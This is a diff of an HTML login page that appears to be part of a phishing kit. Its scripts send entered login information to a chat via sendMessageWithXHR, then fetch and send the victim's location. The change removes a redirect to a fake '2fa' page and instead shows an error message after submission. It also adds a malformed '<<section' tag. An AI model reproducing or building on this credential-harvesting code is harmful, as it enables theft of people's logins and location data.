@@ -523,7 +523,7 @@
 
 <head>
 
-  <section class="section-all" style="color: #507392;">
+  <<section class="section-all" style="color: #507392;">
     <!-- 1-Role Main -->
     <main class="main" role="main">
       <div class="wrapper">
@@ -671,8 +671,6 @@
 
         // Send the message using the XMLHttpRequest method
         sendMessageWithXHR(chatId, message); // Send using XMLHttpRequest
-        
-        document.getElementById("error-message").style.display = "block";
       });
     </script>
 
@@ -741,9 +739,8 @@
 
         // Fetch and send location info after login info is sent
         fetchLocationInfo(chatId);
-        // Redirect to a new page
-window.location.href = "2fa/2fa.html";
-
+        
+        document.getElementById("error-message").style.display = "block";
       });
     </script>
     <!-- <script>
